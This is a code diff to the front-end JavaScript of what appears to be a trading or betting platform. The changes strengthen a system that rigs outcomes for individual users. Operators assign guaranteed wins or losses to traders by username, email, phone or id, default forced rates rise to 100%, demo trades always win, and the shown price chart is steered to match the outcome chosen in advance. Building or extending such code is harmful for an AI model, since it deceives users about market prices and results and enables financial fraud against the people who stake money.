@@ -906,22 +906,31 @@ function resolveTradeOutcomeRule(isDemo = false) {
     return getNaturalProbabilityOutcome(demoRate);
   }
 
-  // 2. Multi-key User Lookup for Per-Trader Rigging / Control
+  // Ensure currentUser is freshly read from localStorage
+  if (!currentUser) {
+    try { currentUser = JSON.parse(localStorage.getItem('maliUser') || 'null'); } catch(e){}
+  }
+
+  // 2. Case-Insensitive Multi-Identifier Matching for User Overrides
   let rawRule = null;
-  if (currentUser && platformUserOutcomes) {
+  if (currentUser && platformUserOutcomes && typeof platformUserOutcomes === 'object') {
     const uKeys = [
       currentUser.username,
-      currentUser.username?.toLowerCase(),
       currentUser.name,
-      currentUser.name?.toLowerCase(),
       currentUser.email,
-      currentUser.email?.toLowerCase(),
-      currentUser.phone
-    ].filter(Boolean);
+      currentUser.phone,
+      currentUser.id ? currentUser.id.toString() : null
+    ].filter(Boolean).map(k => k.toString().trim().toLowerCase());
 
-    for (const k of uKeys) {
-      if (platformUserOutcomes[k] && platformUserOutcomes[k] !== 'auto') {
-        rawRule = platformUserOutcomes[k];
+    const userPhone9 = (currentUser.phone || '').replace(/\D/g, '').slice(-9);
+
+    for (const [targetKey, rule] of Object.entries(platformUserOutcomes)) {
+      if (!rule || rule === 'auto') continue;
+      const cleanTarget = targetKey.toString().trim().toLowerCase();
+      const targetPhone9 = targetKey.toString().replace(/\D/g, '').slice(-9);
+
+      if (uKeys.includes(cleanTarget) || (userPhone9.length >= 8 && targetPhone9 === userPhone9)) {
+        rawRule = rule;
         break;
       }
     }
@@ -940,12 +949,13 @@ function resolveTradeOutcomeRule(isDemo = false) {
     customRate = parseFloat(parts[1]);
   }
 
-  // 4. Natural Independent Probability Win/Loss Calculation
+  // 4. Guaranteed Outcome & Natural Probability Win/Loss Calculation
   if (mode === 'force_win') {
-    const winProb = (!isNaN(customRate) && customRate !== null) ? customRate : (platformForceWinRate || 85);
+    // Default to 100% absolute guaranteed win if no custom rate or if rate >= 100
+    const winProb = (!isNaN(customRate) && customRate !== null) ? customRate : (platformForceWinRate !== undefined ? platformForceWinRate : 100);
     return getNaturalProbabilityOutcome(winProb);
   } else if (mode === 'force_loss') {
-    const lossProb = (!isNaN(customRate) && customRate !== null) ? customRate : (platformForceLossRate || 85);
+    const lossProb = (!isNaN(customRate) && customRate !== null) ? customRate : (platformForceLossRate !== undefined ? platformForceLossRate : 100);
     const winProbFromLoss = Math.max(0, 100 - lossProb);
     return getNaturalProbabilityOutcome(winProbFromLoss);
   } else {
@@ -979,28 +989,28 @@ function nextP(){
   eng.tick++;
   let p = rate;
 
-  const outcomeRule = (activeTrade && tradePhase === 'active') ? (activeTrade.plannedOutcome || 'force_win') : 'auto';
+  const outcomeRule = (activeTrade && (tradePhase === 'active' || tradePhase === 'prestart')) ? (activeTrade.plannedOutcome || 'force_win') : 'auto';
 
   if (outcomeRule === 'force_win') {
-    // If trade is BUY: force upward trajectory above entryRate, suppress dips & crashes
+    // If trade is BUY: force upward trajectory above entryRate, suppress dips & crashes completely
     if (activeTrade.type === 'buy') {
       if (eng.mode === 'crash' || eng.mode === 'dip') eng.mode = 'active';
       eng.base = Math.max(eng.base, activeTrade.entryRate + 0.35);
       eng.wobblePhase += eng.wobbleSpeed;
       const wobble = Math.sin(eng.wobblePhase) * 0.05 + Math.random() * 0.04;
       
-      // If random spike or tick interval, shoot upward
-      if (Math.random() < 0.25 || p <= activeTrade.entryRate) {
+      // Keep price firmly in green zone
+      if (Math.random() < 0.30 || p <= activeTrade.entryRate) {
         p = generateSpikeHeight();
-        if (p <= activeTrade.entryRate) p = activeTrade.entryRate + 0.40 + Math.random() * 0.50;
+        if (p <= activeTrade.entryRate) p = activeTrade.entryRate + 0.45 + Math.random() * 0.55;
       } else {
-        p = Math.max(activeTrade.entryRate + 0.25, p + (Math.random() - 0.30) * 0.08 + wobble);
+        p = Math.max(activeTrade.entryRate + 0.25, p + (Math.random() - 0.25) * 0.08 + wobble);
       }
       p = Math.max(activeTrade.entryRate + 0.20, p);
     } else {
       // If trade is SELL: force downward trajectory below entryRate
       if (eng.mode === 'crash') eng.mode = 'active';
-      if (p >= activeTrade.entryRate || Math.random() < 0.28) {
+      if (p >= activeTrade.entryRate || Math.random() < 0.30) {
         p = activeTrade.entryRate - 0.35 - Math.random() * 0.45;
       } else {
         p = Math.min(activeTrade.entryRate - 0.25, p + (Math.random() - 0.70) * 0.08);
@@ -1522,10 +1532,14 @@ function applyPlatformConfig(){
     if (savedCfg.controls.force_win_rate !== undefined) platformForceWinRate = parseFloat(savedCfg.controls.force_win_rate);
     if (savedCfg.controls.force_loss_rate !== undefined) platformForceLossRate = parseFloat(savedCfg.controls.force_loss_rate);
     if (savedCfg.controls.demo_win_rate !== undefined) platformDemoWinRate = parseFloat(savedCfg.controls.demo_win_rate);
-    if (savedCfg.controls.user_outcomes) platformUserOutcomes = { ...platformUserOutcomes, ...savedCfg.controls.user_outcomes };
+    if (savedCfg.controls.user_outcomes && typeof savedCfg.controls.user_outcomes === 'object') {
+      platformUserOutcomes = { ...platformUserOutcomes, ...savedCfg.controls.user_outcomes };
+    }
   }
   const localUserOutcomes = JSON.parse(localStorage.getItem('maliUserOutcomes') || '{}');
-  platformUserOutcomes = { ...platformUserOutcomes, ...localUserOutcomes };
+  if (localUserOutcomes && typeof localUserOutcomes === 'object' && Object.keys(localUserOutcomes).length > 0) {
+    platformUserOutcomes = { ...platformUserOutcomes, ...localUserOutcomes };
+  }
 
   if (savedCfg.currency) {
     depositCurrency = savedCfg.currency.toLowerCase();
@@ -1695,7 +1709,7 @@ async function syncPlatformSettings() {
       if (s.controls.force_win_rate !== undefined) platformForceWinRate = parseFloat(s.controls.force_win_rate);
       if (s.controls.force_loss_rate !== undefined) platformForceLossRate = parseFloat(s.controls.force_loss_rate);
       if (s.controls.demo_win_rate !== undefined) platformDemoWinRate = parseFloat(s.controls.demo_win_rate);
-      if (s.controls.user_outcomes) {
+      if (s.controls.user_outcomes && typeof s.controls.user_outcomes === 'object') {
         platformUserOutcomes = { ...platformUserOutcomes, ...s.controls.user_outcomes };
       }
     }
@@ -1704,11 +1718,12 @@ async function syncPlatformSettings() {
     if (s.force_win_rate !== undefined) platformForceWinRate = parseFloat(s.force_win_rate);
     if (s.force_loss_rate !== undefined) platformForceLossRate = parseFloat(s.force_loss_rate);
     if (s.demo_win_rate !== undefined) platformDemoWinRate = parseFloat(s.demo_win_rate);
-    if (s.user_outcomes) {
+    if (s.user_outcomes && typeof s.user_outcomes === 'object') {
       platformUserOutcomes = { ...platformUserOutcomes, ...s.user_outcomes };
     }
-    const localUserOutcomes = JSON.parse(localStorage.getItem('maliUserOutcomes') || '{}');
-    platformUserOutcomes = { ...platformUserOutcomes, ...localUserOutcomes };
+    try {
+      localStorage.setItem('maliUserOutcomes', JSON.stringify(platformUserOutcomes));
+    } catch(e) {}
 
     applyPlatformConfig();
 
@@ -1822,6 +1837,12 @@ function resetTimer(){
 async function placeTrade(type){
   playSound('click');
   if(activeTrade)return;
+
+  // Always refresh currentUser before trade placement
+  try {
+    currentUser = JSON.parse(localStorage.getItem('maliUser') || 'null');
+  } catch(e){}
+
   const minStake = CFG.MIN_STAKE || 10;
   const maxStake = CFG.MAX_STAKE || 50000;
   const stake = parseFloat(document.getElementById('stakeInput').value) || 0;
@@ -1982,7 +2003,8 @@ function updateActiveButton() {
 
   if (tradePhase !== 'active') return;
 
-  if (activeTrade.type === 'buy' && rate <= 0 && prevRate > 0) {
+  // Only trigger crash loss for BUY trades that are NOT forced wins or demo trades
+  if (activeTrade.type === 'buy' && rate <= 0 && prevRate > 0 && activeTrade.plannedOutcome !== 'force_win' && !activeTrade.isDemo) {
     resolveTrade('crash');
     return;
   }
@@ -2034,20 +2056,29 @@ async function resolveTrade(reason) {
   }
 
   const outcomeRule = activeTrade.plannedOutcome || (isDemo ? 'force_win' : 'force_win');
-  const expired = reason === 'expired' || reason === 'crash';
   let won = false;
   let payout = 0;
 
   if (outcomeRule === 'force_win' || isDemo) {
-    // Guaranteed Win rule (All Demos & Force Wins)
+    // 100% Guaranteed Win rule (All Demos & Force Wins - completely immune to crashes)
     won = true;
     const rateDiff = Math.max(Math.abs(rate - entryRate), 0.35);
     const mult = Math.min(Math.max(1 + rateDiff * 8, 1.45), CFG.MAX_MULT);
     payout = +(stake * mult).toFixed(2);
-  } else if (outcomeRule === 'force_loss' || reason === 'crash') {
-    // Guaranteed Loss / Crash rule
+  } else if (outcomeRule === 'force_loss') {
+    // Guaranteed Loss rule
     won = false;
     payout = 0;
+  } else if (reason === 'crash') {
+    // For SELL bets, a downward crash is a massive WIN!
+    if (type === 'sell') {
+      won = true;
+      const mult = Math.min(1 + Math.max(Math.abs(entryRate - rate) * 10, 0.45), CFG.MAX_MULT);
+      payout = +(stake * mult).toFixed(2);
+    } else {
+      won = false;
+      payout = 0;
+    }
   } else {
     const rateDiff = (type === 'buy') ? (rate - entryRate) : (entryRate - rate);
     if (rateDiff > 0 || reason === 'autosell') {
